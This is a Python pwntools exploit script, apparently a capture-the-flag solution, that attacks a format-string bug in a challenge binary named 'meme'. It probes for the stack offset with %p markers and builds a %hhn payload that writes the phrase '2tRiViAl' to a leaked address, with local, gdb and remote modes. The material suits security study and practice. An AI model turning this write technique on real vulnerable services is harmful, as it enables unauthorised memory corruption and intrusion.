from pwn import *


PROGRAM_PATH = (Path(__file__).parent / "meme").resolve().__str__()
# b * printf + 166

gdb_script = """
b *main+191
b *main+236
c
"""
# elf = ELF("./meme")
# win_addr = elf.got["win"]
# print(elf.got)

frame_size = 0x220  # 544
rbp = 8
buff_size = 0x200


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


phrase_byte = b"2tRiViAl"
phrase = u64(phrase_byte, endianness="little")

print(f"Phrase is: {hex(phrase)}")

io = start()
# print(io.got["printf"])
res = io.recvuntil(delims="at ")
print("____________________________________")
target = io.recvline().decode("ascii").strip()


print(f"Target addr {target}")
target = int(target, base=16)
res = io.recvuntil(delims=": ")
print(res)
print("____________________________________")

# Find the offset
# tag = 8 * b"A" * 10
# fmt = "|".join(f"{i}: %{i}$p" for i in range(1, buff_size)).encode()
# payload = tag + b"|" + fmt
# io.sendline(payload)


def probe_offset(limit=50):
    p = start()
    p.recvuntil(delims="at ")
    target = p.recvline().decode("ascii").strip()
    print(f"Target addr {target}")
    target = int(target, base=16)
    p.recvuntil(delims=": ")

    marker = b"A" * 8
    probe = marker + b"|".join(f"%{i}$p".encode() for i in range(1, limit))
    p.sendline(probe)
    res = p.recvlines(2)[1].decode(errors="ignore")
    for i, tok in enumerate(res.split("|"), 1):
        if "4141414141414141" in tok:
            return i
    return None


offset = 10
# offset = probe_offset()
print(f"Offset found:{offset}")

# # Write 2tRiViAl to the format,


fmt = (
    f"%50c%{offset}$hhn".encode("ascii")
    + f"%66c%{offset+1}$hhn".encode("ascii")
    + f"%222c%{offset+2}$hhn".encode("ascii")
    + f"%23c%{offset+3}$hhn".encode("ascii")
)


payload = fmt + p64(target + 0) + p64(target + 1) + p64(target + 2) + p64(target + 3)

# Align to 8 bytes
if len(fmt) % 8:
    pad = b"A" * (-len(fmt) % 8)
    payload = (
        fmt
        + pad
        + p64(target + 0)
        + p64(target + 1)
        + p64(target + 2)
        + p64(target + 3)
    )


print(f"Payload size: {payload}")
print(f"Payload size: {len(payload)}")
io.sendline(payload)

# print("____________________________________")
# res = io.recvlines(2)
# print(res)


io.interactive()
